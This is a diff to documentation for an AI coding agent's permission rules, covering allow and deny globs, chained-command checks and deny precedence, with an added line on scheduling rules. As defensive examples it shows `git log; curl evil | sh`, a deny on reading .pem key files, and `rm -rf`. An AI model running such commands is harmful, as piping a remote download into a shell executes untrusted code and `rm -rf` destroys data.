@@ -14,7 +14,7 @@ Every tool declares a tier: **read** (always allowed), **write** (file changes),
 Prefix globs, deliberately not a policy language: `bash(git *)`, `write(src/*)`, `mcp__github__*` (bare rules match tool names). "Yes, always for this project" in a prompt persists a rule to `.aerin/settings.json`. Chained bash commands (`;&|` backticks `$()><`) always ask even under an allow rule — `git log; curl evil | sh` matches `bash(git *)` but is a different action.
 
 ## Deny rules
-Same syntax, in `permissions.deny`. **Deny beats everything**: allow rules, accept mode, plan mode's read pass-through, and `--yolo` (which means "auto-approve everything not explicitly denied"). Denies apply to read-tier too (`read(*.pem*)`), and bash denies are matched against every segment of a chained command, so `bash(rm *)` catches `git pull && rm -rf x`. The model is told which rule blocked it and instructed not to work around it. A deny on `agent(worker)` or `agent(<name>)` controls which sub-agents may be spawned.
+Same syntax, in `permissions.deny`. **Deny beats everything**: allow rules, accept mode, plan mode's read pass-through, and `--yolo` (which means "auto-approve everything not explicitly denied"). Denies apply to read-tier too (`read(*.pem*)`), and bash denies are matched against every segment of a chained command, so `bash(rm *)` catches `git pull && rm -rf x`. The model is told which rule blocked it and instructed not to work around it. A deny on `agent(worker)` or `agent(<name>)` controls which sub-agents may be spawned. [Scheduling](scheduling.md) rules match on `<action> <task>`: `schedule(add *)`, deny `schedule(remove backup*)`.
 
 ## Invariants
 - Deny check runs first in `decide()` — before the read-tier fast path.
